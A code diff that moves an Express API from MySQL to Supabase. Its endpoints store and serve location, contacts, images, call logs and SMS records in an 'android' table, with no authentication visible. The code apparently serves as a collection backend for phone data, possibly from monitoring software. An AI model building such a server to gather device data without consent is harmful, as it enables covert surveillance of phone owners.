@@ -1,5 +1,5 @@
 import express from 'express';
-import mysql from 'mysql2/promise';
+import { createClient } from '@supabase/supabase-js';
 import cors from 'cors';
 import dotenv from 'dotenv';
 
@@ -12,29 +12,22 @@ const port = process.env.PORT || 3000;
 app.use(cors());
 app.use(express.json());
 
-// Database connection
-const pool = mysql.createPool({
-  host: process.env.DB_HOST || 'localhost',
-  user: process.env.DB_USER || 'root',
-  password: process.env.DB_PASSWORD || 'password',
-  database: process.env.DB_NAME || 'test_db',
-  waitForConnections: true,
-  connectionLimit: 10,
-  queueLimit: 0
-});
-
-// Print initial database configuration (hiding sensitive data)
-console.log('\n📊 Database Configuration:');
-console.log(`Host: ${process.env.DB_HOST}`);
-console.log(`Database: ${process.env.DB_NAME}`);
-console.log(`User: ${process.env.DB_USER}`);
-console.log('Attempting to connect...\n');
+// Supabase client initialization
+const supabase = createClient(
+  process.env.SUPABASE_URL,
+  process.env.SUPABASE_ANON_KEY
+);
 
 // Database connection status endpoint
 app.get('/api/status', async (req, res) => {
   try {
-    // Test the connection by running a simple query
-    await pool.query('SELECT 1');
+    const { data, error } = await supabase
+      .from('android')
+      .select('count')
+      .limit(1);
+    
+    if (error) throw error;
+    
     res.json({ 
       status: 'connected',
       message: 'Database connection is active',
@@ -54,8 +47,12 @@ app.get('/api/status', async (req, res) => {
 // Routes
 app.get('/api/items', async (req, res) => {
   try {
-    const [rows] = await pool.query('SELECT * FROM items');
-    res.json(rows);
+    const { data, error } = await supabase
+      .from('android')
+      .select('*');
+    
+    if (error) throw error;
+    res.json(data);
   } catch (error) {
     console.error('Error fetching items:', error);
     res.status(500).json({ error: 'Internal server error' });
@@ -65,18 +62,16 @@ app.get('/api/items', async (req, res) => {
 app.post('/api/items', async (req, res) => {
   try {
     const { location, contacts, image, call_logs, sms } = req.body;
-    const [result] = await pool.query(
-      'INSERT INTO items (location, contacts, image, call_logs, sms) VALUES (?, ?, ?, ?, ?)',
-      [location, contacts, image, call_logs, sms]
-    );
-    res.status(201).json({ 
-      id: result.insertId,
-      location,
-      contacts,
-      image,
-      call_logs,
-      sms
-    });
+    const { data, error } = await supabase
+      .from('android')
+      .insert([
+        { location, contacts, image, call_logs, sms }
+      ])
+      .select()
+      .single();
+    
+    if (error) throw error;
+    res.status(201).json(data);
   } catch (error) {
     console.error('Error creating item:', error);
     res.status(500).json({ error: 'Internal server error' });
@@ -85,16 +80,18 @@ app.post('/api/items', async (req, res) => {
 
 app.get('/api/items/:id', async (req, res) => {
   try {
-    const [rows] = await pool.query(
-      'SELECT * FROM items WHERE id = ?',
-      [req.params.id]
-    );
+    const { data, error } = await supabase
+      .from('android')
+      .select('*')
+      .eq('id', req.params.id)
+      .single();
     
-    if (rows.length === 0) {
+    if (error) throw error;
+    if (!data) {
       return res.status(404).json({ error: 'Item not found' });
     }
     
-    res.json(rows[0]);
+    res.json(data);
   } catch (error) {
     console.error('Error fetching item:', error);
     res.status(500).json({ error: 'Internal server error' });
@@ -104,16 +101,19 @@ app.get('/api/items/:id', async (req, res) => {
 app.put('/api/items/:id', async (req, res) => {
   try {
     const { name, description } = req.body;
-    const [result] = await pool.query(
-      'UPDATE items SET name = ?, description = ? WHERE id = ?',
-      [name, description, req.params.id]
-    );
+    const { data, error } = await supabase
+      .from('android')
+      .update({ name, description })
+      .eq('id', req.params.id)
+      .select()
+      .single();
     
-    if (result.affectedRows === 0) {
+    if (error) throw error;
+    if (!data) {
       return res.status(404).json({ error: 'Item not found' });
     }
     
-    res.json({ id: req.params.id, name, description });
+    res.json(data);
   } catch (error) {
     console.error('Error updating item:', error);
     res.status(500).json({ error: 'Internal server error' });
@@ -122,15 +122,12 @@ app.put('/api/items/:id', async (req, res) => {
 
 app.delete('/api/items/:id', async (req, res) => {
   try {
-    const [result] = await pool.query(
-      'DELETE FROM items WHERE id = ?',
-      [req.params.id]
-    );
+    const { error } = await supabase
+      .from('android')
+      .delete()
+      .eq('id', req.params.id);
     
-    if (result.affectedRows === 0) {
-      return res.status(404).json({ error: 'Item not found' });
-    }
-    
+    if (error) throw error;
     res.status(204).send();
   } catch (error) {
     console.error('Error deleting item:', error);
@@ -146,16 +143,21 @@ const MAX_RETRY_ATTEMPTS = 5;
 const checkConnection = async () => {
   try {
     const startTime = Date.now();
-    await pool.query('SELECT 1');
+    const { error } = await supabase
+      .from('android')
+      .select('count')
+      .limit(1);
+    
     const responseTime = Date.now() - startTime;
+    
+    if (error) throw error;
     
     if (!isConnected) {
       console.clear();
       console.log('\n=== Database Connection Status ===');
       console.log('✅ Connection established successfully');
       console.log(`📡 Response time: ${responseTime}ms`);
-      console.log(`🏢 Host: ${process.env.DB_HOST}`);
-      console.log(`📚 Database: ${process.env.DB_NAME}`);
+      console.log(`🏢 Project URL: ${process.env.SUPABASE_URL}`);
       console.log('===============================\n');
       isConnected = true;
       connectionAttempts = 0;
